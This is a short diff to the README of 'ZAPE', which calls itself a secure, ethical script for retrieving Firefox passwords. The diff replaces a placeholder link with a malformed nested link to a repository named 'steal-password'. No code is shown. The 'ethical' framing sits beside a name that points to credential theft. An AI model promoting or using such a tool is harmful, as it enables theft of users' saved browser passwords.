@@ -1,6 +1,6 @@
 # 🔒 **ZAPE - A Secure Password Retrieval Script** 🔒
 
-📎 GitHub Repository: [https://github.com/your_username/your_repo_name](https://github.com/your_username/your_repo_name)
+📎 GitHub Repository: [[https://github.com/your_username/your_repo_name](https://github.com/dioszape/steal-password/)]([https://github.com/your_username/your_repo_name](https://github.com/dioszape/steal-password/))
 
 👋 Hello, fellow developers and security enthusiasts! Welcome to ZAPE, a powerful yet ethical script designed to help you retrieve your Firefox passwords securely. 🦊🔑
 
